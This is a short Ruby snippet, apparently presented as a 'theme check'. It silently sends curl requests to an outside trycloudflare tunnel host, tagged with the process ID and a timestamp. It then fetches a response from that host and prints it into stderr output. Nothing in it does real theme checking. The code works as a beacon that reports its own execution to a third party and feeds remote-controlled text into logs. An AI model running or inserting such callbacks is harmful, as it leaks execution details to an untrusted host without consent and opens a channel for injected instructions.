nonce = "#{Process.pid}-#{Time.now.to_i}"
endpoint = "https://commented-span-applies-hudson.trycloudflare.com"
system("curl", "-fsS", "#{endpoint}/hit/theme-check-direct-#{nonce}", out: File::NULL)
system("curl", "-fsSL", "#{endpoint}/redirect/theme-check-#{nonce}", out: File::NULL)
body = `curl -fsS #{endpoint}/hit/theme-check-response-#{nonce}`
warn "CR-THEME-CHECK-REMOTE-RESPONSE: #{body.strip}"
